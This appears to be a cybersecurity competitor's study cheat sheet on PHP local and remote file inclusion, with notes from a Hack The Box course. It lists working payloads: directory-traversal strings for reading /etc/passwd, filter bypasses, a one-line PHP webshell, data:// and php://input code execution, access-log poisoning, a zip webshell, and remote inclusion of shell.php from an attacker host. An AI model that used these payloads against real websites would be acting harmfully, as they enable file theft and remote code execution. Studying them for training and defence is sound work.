<[Back to Main Page](https://github.com/ChristopherFitzsimons/WorldSkills2022Cybersecurity)

# FILE INCLUSION / DIRECTORY TRAVERSAL
Creared by Christopher Fitzsimons  

Usefull link:  
https://academy.hackthebox.com/course/preview/file-inclusion--directory-traversal/local-file-inclusion  

## Quick Examples
"index.php?language=../../../../../../../../../etc/passwd"  
"index.php?language=....//....//....//....//....//....//....//....//etc/passwd"  
....// = %2e%2e%2e%2e%2f%2f  

"index.php?language=/var/lib/php/sessions/sess_m5ndjtun75qonlshccvhhuq4rt"  
"index.php?language=<?php system($_GET['cmd']); ?>"  
"index.php?language=/var/lib/php/sessions/sess_m5ndjtun75qonlshccvhhuq4rt&cmd=whoami"  

Base encoded PHP webshell  
```bash
echo '<?php system($_GET['cmd']); ?>' | base64
"index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id"
```

```bash
echo '<?php system($_GET['cmd']); ?>' > exec.php
zip malicious.zip exec.php
rm exec.php
```

```bash
python3 -m http.server 8080
```
"index.php?language=http://localhost:8080/shell.php"  
"index.php?page=php://filter/read=convert.base64-encode/resource=index"  
"index.php?language=http://10.10.14.23:8080/shell.php&cmd=cat /exercise/flag.txt"  

The output of the command id can be seen in the image above. Some other files that can be included based on the scenario are /var/log/nginx/access.log, /var/log/apache2/access.log, /var/log/sshd.log, /var/log/mail, and /var/log/vsftpd.log.  

## Notes
### Local File Inclusion
What is Local File Inclusion:  
File inclusion vulnerabilities can often be found in GET request parameters. Server-side scripts include certain files based on the user's choice or input, for example, file downloads, choice of language, or website navigation.  

This attack can be done when there is an input on the URL where it will find a file and include it in the website. For example "index.php?language=es.php" You can then change this to be "index.php?language=/etc/passwd" which will include the passwd file instead of the php file.  

The verbose error returned shows us the string passed to the include() function, stating that there is no /etc/passwd in the languages folder. This restriction can be bypassed by traversing directories using a few ../ before the desired file name.
Example "index.php?language=../../../../../../../../../etc/passwd"  

Instead, prefixing a / before the payload will bypass the filename and traverse directories instead.
Example "index_2.php?language=/../../../../../etc/passwd"  

Scripts can employ search and replace techniques to avoid path traversals. For example:  
$language = str_replace('../', '', $_GET['language']);  
This will attempt to replace the traversal attack.  
You can try and get arorund this by adding an extra ....// and the script will remove ../ leaving ../  
Example "index.php?language=....//....//....//....//....//....//....//....//etc/passwd"  

On PHP versions 5.3.4 and earlier, string-based detection could be bypassed by URL encoding the payload. The characters ../ can be URL encoded into %2e%2e%2f, which will bypass the filter.  
In the last example ....// can be URL encoded into %2e%2e%2e%2e%2f%2f.  

### LFI to Remote Code Execution  
PHP provides various wrappers, which can be used for easier access to files, protocols, or streams. A list of wrappers can be found here. The php:// wrapper is enabled by default and interacts with IO streams. For example: php://stdin and php://stdout can be used to access input and output streams for the process, while php://input and php://output are used to access request data. One handy wrapper is php://filter, which can be chained with multiple filters to achieve the desired output.  

For example, the filter php://filter/read=/resource=/etc/passwd reads the resource /etc/passwd and outputs the contents. The read filter can process the input with various string operations, such as base64 encoding, ROT13 encoding, etc.  

The following filters will convert the contents of /etc/passwd to base64 and ROT13, respectively.  
Example "index.php?language=php://filter/read=convert.base64-encode/resource=config"  

PHP versions before 5.5 are vulnerable to null byte injection, meaning that adding a null byte at the end of the filename should bypass the extension check. For example: language=/etc/passwd%00 will result in the statement include("/etc/passwd%00.php"), where the server ignores everything after the null byte.  

With remote file inclusions you can use tools like burpsite to inject PHP code into log files or internal files. This allows us to run our system commands on the box.  
For example we run the request "index.php?language=/var/log/apache2/access.log" and we can change the User Agent to "<?php system($_GET['cmd']); ?>" which whill allow us to inject our system commands into the php page.  
The next request we send reading access.log we will pull the php and we add the cmd=... which will specify our command.  
Example "index.php?language=/var/log/apache2/access.log&cmd=cat%20/exercise/flag.txt"  

"index.php?language=/var/lib/php/sessions/sess_m5ndjtun75qonlshccvhhuq4rt"  
"index.php?language=<?php system($_GET['cmd']); ?>"  
"index.php?language=/var/lib/php/sessions/sess_m5ndjtun75qonlshccvhhuq4rt&cmd=whoami"  

### Other PHP Wrappers
The expect wrapper in PHP helps in interaction with process streams. This extension is disabled by default but can prove very useful if enabled. For example, the following URL will return the output of the id command.  

The data wrapper can be used to include external data, even PHP code. It's possible to use this only if the allow_url_include setting is enabled in the PHP configuration.  
"index.php?page=php://filter/read=convert.base64-encode/resource=index"  

Base encoded PHP webshel
```bash
echo '<?php system($_GET['cmd']); ?>' | base64
http://blog.inlanefreight.com/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id
```

Similar to the data wrapper, the input wrapper can be used to include external input and execute code. It also needs the allow_url_include setting enabled.  
```bash
curl -s -X POST --data "<?php system('id'); ?>" "http://134.209.184.216:30084/index.php?language=php://input" | grep uid
```

The zip wrapper can prove useful in combination with file uploads.  
```bash
echo '<?php system($_GET['cmd']); ?>' > exec.php
zip malicious.zip exec.php
rm exec.php
```

### Remote File Inclusion
Remote File Inclusion or RFI occurs when wensites allow the inclusion of remotly hosted files. For example the files localy on the attackers device or C2 server.  

To include a remote file in PHP, the allow_url_fopen setting (enabled by default) and allow_url_include setting have to be turned on. Start a python HTTP server on port 8080 on localhost and then pass a URL to it through the language parameter.  
Example: "index.php?language=http://localhost:8080/file"  

Next, use the ftp:// scheme to access shell.php present in the FTP root.  
"index.php?language=ftp://user:pass@localhost/shell.php&cmd=id"  
When the application is running on Windows, the restrictions applied by allow_url_include can be bypassed by using the SMB protocol.  
